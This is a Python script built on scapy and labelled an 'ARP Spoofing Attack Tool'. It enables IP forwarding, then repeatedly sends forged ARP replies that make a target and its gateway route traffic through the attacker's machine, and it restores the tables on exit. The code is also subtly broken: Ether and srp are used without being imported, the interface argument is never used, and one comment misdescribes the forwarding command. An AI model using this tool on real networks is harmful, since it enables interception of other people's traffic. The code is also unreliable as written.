import argparse
from scapy.all import ARP, send
import time
import sys
from os import system


def get_mac(ip):
    """Returns the MAC address of the given IP address"""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc if answered_list else None


def spoof(target_ip, spoof_ip, target_mac):
    """Sends an ARP response to the target to associate the spoof_ip with the attacker's MAC"""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)


def restore(target_ip, gateway_ip, target_mac, gateway_mac):
    """Restores the original ARP configuration by sending correct ARP responses"""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    send(packet, count=4, verbose=False)


def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing Attack Tool")
    parser.add_argument("-t", "--target", type=str, help="Target IP address", required=True)
    parser.add_argument("-g", "--gateway", type=str, help="Gateway IP address", required=True)
    parser.add_argument("-i", "--interface", type=str, help="Network interface", required=True)

    args = parser.parse_args()

    # Set the specified network interface
    system(f"echo 1 > /proc/sys/net/ipv4/ip_forward")

    # Get the MAC addresses of the target and the gateway
    target_mac = get_mac(args.target)
    gateway_mac = get_mac(args.gateway)

    if not target_mac or not gateway_mac:
        print("Could not find MAC addresses. Exiting...")
        sys.exit(1)

    try:
        print(f"Starting ARP spoofing on {args.target}...")
        while True:
            # Spoof both the victim and the gateway
            spoof(args.target, args.gateway, target_mac)  # Victim thinks attacker is the gateway
            spoof(args.gateway, args.target, gateway_mac)  # Gateway thinks attacker is the victim
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nRestoring ARP tables, please wait...")
        restore(args.target, args.gateway, target_mac, gateway_mac)
        restore(args.gateway, args.target, gateway_mac, target_mac)
        print("ARP tables restored. Exiting...")


if __name__ == "__main__":
    main()
